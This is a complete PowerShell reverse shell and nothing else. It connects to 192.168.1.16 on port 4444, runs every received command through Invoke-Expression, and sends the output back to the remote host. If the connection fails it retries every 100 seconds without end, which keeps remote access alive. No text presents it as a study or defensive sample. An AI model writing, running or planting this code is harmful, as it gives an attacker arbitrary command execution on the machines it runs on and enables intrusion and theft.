$ip = "192.168.1.16"
$port = 4444

while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($ip, $port)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)

        function Execute-Command {
            param([string]$cmd)

            $output = $errorOutput = $null

            try {
                $output = Invoke-Expression -Command $cmd
            } catch {
                $errorOutput = $_.Exception.Message
            }

            return $output, $errorOutput
        }

        while ($true) {
            $prompt = (Get-Location).Path + "> "
            $writer.Write($prompt)
            $writer.Flush()

            $command = $reader.ReadLine()

            if ($command -eq "exit") {
                break
            }

            if ($command -match '^cd\s+/d\s+(\S+)$') {
                $drive = $matches[1]
                Set-Location -Path $drive
                continue
            }

            $output, $errorOutput = Execute-Command -cmd $command

            $writer.WriteLine($output -join "`n")
            $writer.WriteLine($errorOutput)
            $writer.Flush()
        }
    } catch {
        
    } finally {
        $client.Close()
    }

    
    Start-Sleep -Seconds 100
}
